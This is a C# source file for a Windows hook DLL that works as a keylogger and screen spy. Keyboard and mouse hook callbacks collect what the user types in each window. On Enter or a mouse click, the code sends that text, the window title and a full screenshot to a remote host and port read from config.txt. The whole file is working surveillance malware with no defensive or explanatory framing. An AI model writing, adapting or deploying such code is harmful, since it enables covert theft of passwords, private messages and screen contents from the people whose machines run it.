using HookHandlerDLL;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HookDLL
{
    public class HookProceduces
    {
        Dictionary<IntPtr, string> keys ;
        KeysConverter keysConverter;
        Client client;

        public  HookProceduces()
        {
            keys = new Dictionary<IntPtr, string>();
            keysConverter = new KeysConverter();
            string[] data=System.IO.File.ReadAllLines("config.txt");
            client = new Client(data[0],Convert.ToInt32(data[1]));
        }

        #region keyHook
        private const int WM_KEYUP = 0x101;
        private const int WM_KEYDOWN = 0x0100;
        private struct KeyboardHookStruct
        {
            public int VirtualKeyCode;
            public int ScanCode;
            public int Flags;
            public int Time;
            public int ExtraInfo;
        }
        public IntPtr KeyHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                KeyboardHookStruct hookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
                char k = (char)hookStruct.VirtualKeyCode;
                if (k == 13)
                {
                    GetOut();
                }
                else
                {
                    IntPtr p = GetForegroundWindow();
                   
                    if (keys.ContainsKey(p))
                    {
                        
                        keys[p]+= k;
                    }
                    else
                    {
                        keys.Add(p, ""+k);
                    }
                }
            }
            return IntPtr.Zero;
        }
        #endregion

        #region MouseHook

        private struct POINT
        {
            public int x;
            public int y;
        }
        private struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public UInt32 mouseData;
            public UInt32 flags;
            public UInt32 time;
            public IntPtr dwExtraInfo;
        }
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_RBUTTONUP = 0x0205;

        public  IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            MSLLHOOKSTRUCT MyMouseHookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));

            if (nCode >= 0)
            {
                int type = wParam.ToInt32();
                if ( type == WM_LBUTTONUP )
                {
                    GetOut();
                }

            }
            return IntPtr.Zero;
        }
        #endregion

        #region other info 
        public void GetOut()
        {
            IntPtr p = GetForegroundWindow();
            
            if (keys.ContainsKey(p))
            {
                StringBuilder name = new StringBuilder(20);
                GetWindowText(p, name, name.Capacity);
                string transferString = keys[p]+"/"+ name;
                keys.Remove(p);
                client.Send(transferString);
                client.Send(PrintScreen());
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private Bitmap PrintScreen()
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
            return printscreen;

        }

        
        #endregion
    }
}
